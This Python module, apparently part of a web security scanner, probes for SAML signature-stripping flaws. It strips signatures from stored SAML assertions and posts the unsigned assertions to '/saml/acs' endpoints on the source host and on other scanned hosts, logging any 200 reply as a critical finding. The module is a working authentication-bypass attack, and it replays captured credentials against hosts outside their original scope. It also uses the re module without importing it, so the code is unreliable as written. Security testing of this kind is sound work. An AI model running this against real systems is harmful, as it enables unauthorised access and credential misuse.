"""SAML signature stripping attack probes."""

from __future__ import annotations

import base64
import logging
from typing import Any
from urllib.parse import urlparse

from src.analysis.active.auth.credential_vault import CredentialVault
from src.analysis.passive.runtime import ResponseCache
from src.analysis._core.http_request import _safe_request

logger = logging.getLogger(__name__)

SIGNATURE_PATTERN = re.compile(r"<Signature[^>]*>.*?</Signature>", re.IGNORECASE | re.DOTALL)




def _strip_signature(xml_text: str) -> str | None:
    if SIGNATURE_PATTERN.search(xml_text) is None:
        return None
    stripped = SIGNATURE_PATTERN.sub("", xml_text)
    return stripped if stripped != xml_text else None


def _to_base64(xml_text: str) -> str:
    return base64.b64encode(xml_text.encode("utf-8")).decode("ascii")


def _submit_unsigned(url: str, saml_response_b64: str) -> dict[str, Any] | None:
    body = "SAMLResponse=" + saml_response_b64 + "&RelayState="
    return _safe_request(url, method="POST", body=body.encode("utf-8"), timeout=12)


def _endpoint_key(url: str) -> str:
    try:
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.hostname}{parsed.path or '/'}"
    except Exception:  # noqa: S110
        return url


def _netloc(url: str) -> str:
    try:
        return _clean(urlparse(url).hostname)
    except Exception:  # noqa: S110
        return ""


def _build_targets(source_url: str, scan_hosts: set[str]) -> list[str]:
    netlocs = {_netloc(source_url)} if _netloc(source_url) else set()
    netlocs.update(_clean(host) for host in scan_hosts if _is_web_target(host))
    if not netlocs:
        return [source_url]
    return [f"https://{netloc}/saml/acs" for netloc in netlocs]


def _clean(host: str) -> str:
    return (host or "").split(":", 1)[0].strip().lower()


def _is_web_target(host: str) -> bool:
    host = _clean(host)
    if not host:
        return False
    return host.endswith((".com", ".io", ".co", ".org", ".net", ".app")) or (not host.endswith((".local", ".lan", ".internal")))


def run_signature_strip(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    credential_vault: CredentialVault | None = None,
    *,
    limit: int = 12,
) -> list[dict[str, Any]]:
    vault = credential_vault or CredentialVault()
    findings: list[dict[str, Any]] = []
    seen_endpoints: set[str] = set()
    history = vault.saml_assertions()
    for entry in history:
        if len(findings) >= limit:
            break
        credential_id = entry.get("credential_id")
        credential = vault.get_credential_for_url(entry.get("scope_url") or "")
        assertion_value = credential.value if credential else entry.get("assertion_value")
        if not assertion_value:
            continue
        source_url = entry.get("scope_url") or ""
        endpoint_key = _endpoint_key(source_url)
        if endpoint_key in seen_endpoints:
            continue
        seen_endpoints.add(endpoint_key)
        stripped_xml = _strip_signature(assertion_value)
        if not stripped_xml:
            continue
        for target in _build_targets(source_url, vault.scan_host_netlocs):
            if len(findings) >= limit:
                break
            response = _submit_unsigned(target, _to_base64(stripped_xml))
            if not response or int(response.get("status", 0)) != 200:
                continue
            findings.append(
                {
                    "url": target,
                    "endpoint_key": endpoint_key,
                    "attack": "signature_stripped_accepted",
                    "original_credential_id": credential_id,
                    "original_scope_url": source_url,
                    "response_status": 200,
                    "confidence": 0.91,
                    "severity": "critical",
                }
            )
    findings.sort(key=lambda item: (-item.get("confidence", 0.0), item.get("url", "")))
    return findings[:limit]
